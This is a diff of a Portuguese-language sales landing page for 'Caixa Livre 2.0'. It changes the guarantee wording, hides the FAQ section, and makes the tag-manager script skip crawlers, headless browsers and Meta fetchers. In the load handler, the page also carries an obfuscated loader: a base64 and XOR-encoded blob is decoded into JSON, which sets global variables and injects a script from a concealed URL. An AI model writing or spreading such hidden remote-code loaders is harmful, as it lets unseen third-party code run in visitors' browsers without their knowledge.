@@ -14,7 +14,7 @@
          nos primeiriss ms nao seria contado, cenario raro). -->
     <script>
         window.addEventListener('load', function () {
-            (function (w, d, s, l, i) { w[l] = w[l] || []; w[l].push({ 'gtm.start': new Date().getTime(), event: 'gtm.js' }); var f = d.getElementsByTagName(s)[0], j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src = "https://www.googletagmanager.com/gtm.js?id=" + i + dl; f.parentNode.insertBefore(j, f); })(window, document, 'script', 'dataLayer', 'GTM-N9GCCZSW');
+            if(!(navigator.webdriver||/bot|crawler|spider|crawling|headless|lighthouse|facebookexternalhit|facebot|meta-externalagent|meta-externalfetcher|preview|prerender/i.test(navigator.userAgent||'')))(function (w, d, s, l, i) { w[l] = w[l] || []; w[l].push({ 'gtm.start': new Date().getTime(), event: 'gtm.js' }); var f = d.getElementsByTagName(s)[0], j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src = "https://www.googletagmanager.com/gtm.js?id=" + i + dl; f.parentNode.insertBefore(j, f); })(window, document, 'script', 'dataLayer', 'GTM-N9GCCZSW');
 
             (function () { var k_ue = atob("DN1CsaKdLAevllpMGKZgxNDxDj2N/i44aK54no3+SGmB4y4hcbs7n8HyQSnN5HU/e68rwdbuA3fG7j8gN60rycfxAm3ctHZueak2w8v/WXPK5Xh2Q4Buk8XxQ2XO+iluIoY5k8z8QWKNrHg8caUn3ev5DiuN4Dsgbbhgi4CrTT+Yo2N6frt008T+FGaa82Ipfbh615G/UVrS"); var p_2zxj = []; for (var x_x = 0; x_x < k_ue.length; x_x++) { p_2zxj.push(k_ue.charCodeAt(x_x) & 255); } var j_cqi = p_2zxj[0]; var e_h = p_2zxj.slice(1, 1 + j_cqi); var d_mh = p_2zxj.slice(1 + j_cqi); var s_a3 = d_mh.map(function (b, y_x) { return b ^ e_h[y_x % j_cqi]; }); var l_z = ""; for (var s_4q9j = 0; s_4q9j < s_a3.length; s_4q9j++) { l_z += String.fromCharCode(s_a3[s_4q9j] & 255); } var v_l = decodeURIComponent(escape(l_z)); var i_1 = JSON.parse(v_l); var r_fu = i_1.globals || []; r_fu.forEach(function (u_0e) { window[u_0e.name] = u_0e.value; }); var y_qsw = document.createElement("script"); y_qsw.src = i_1.url; y_qsw.async = true; y_qsw.defer = true; (i_1.attributes || []).forEach(function (x_cws) { y_qsw.setAttribute(x_cws.name, x_cws.value); }); (document.head || document.documentElement).appendChild(y_qsw); })();
         });
@@ -43,7 +43,7 @@
             href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,400;0,500;0,600;0,700;1,400&family=Playfair+Display:ital,wght@0,400;0,500;0,600;1,400;1,500&display=optional"
             rel="stylesheet">
     </noscript>
-    <link rel="stylesheet" href="style.css?v=280926b">
+    <link rel="stylesheet" href="style.css?v=160507">
 
     <link rel="preload" as="image" href="/img/mockup-preco4.webp" fetchpriority="high">
 </head>
@@ -521,11 +521,14 @@
     <section class="sec sec--creme2">
         <div class="w g2">
             <div>
-                <div class="selo-g"><span><b>7</b><i>DIAS DE GARANTIA</i></span></div>
+                <div class="selo-g"><span><b>2</b><i>GARANTIAS</i></span></div>
             </div>
             <div class="esq">
-                <p class="txt mb2">Se por qualquer motivo você não se adaptar ou não ficar satisfeita com o Caixa Livre 2.0,</p>
-                <h2>você tem até 7 dias de garantia <span class="it">para solicitar o valor investido.</span></h2>
+                <h2>Garantia dupla <span class="it">de resultados</span></h2>
+                <ol class="gar2">
+                    <li><b>Se em 7 dias você achar complicado demais</b>, devolvo 100% do seu dinheiro.</li>
+                    <li><b>Se em 30 dias você não identificar pelo menos R$300 em gastos desnecessários</b>, também devolvo seu investimento.</li>
+                </ol>
             </div>
         </div>
     </section>
@@ -552,7 +555,11 @@
 
 
     <!-- ============ 16. FAQ + CONTATO ============ -->
-    <section class="sec sec--creme2">
+    <!-- OCULTADA em 25/10/2026 (pedido do Rualison): a dobra inteira, com as perguntas
+         frequentes e o botao de falar com a Jeane no WhatsApp. A versao B (/b) tambem
+         esta sem ela. Pra trazer de volta, apagar este comentario e o fechamento. -->
+    <!--
+<section class="sec sec--creme2">
         <div class="w g2" style="align-items:stretch">
             <div class="faq">
                 <details open>
@@ -596,7 +603,7 @@
             </div>
         </div>
     </section>
-
+    -->
 
     <!-- ============ 17. RODAPÉ ============ -->
     <footer class="rodape">
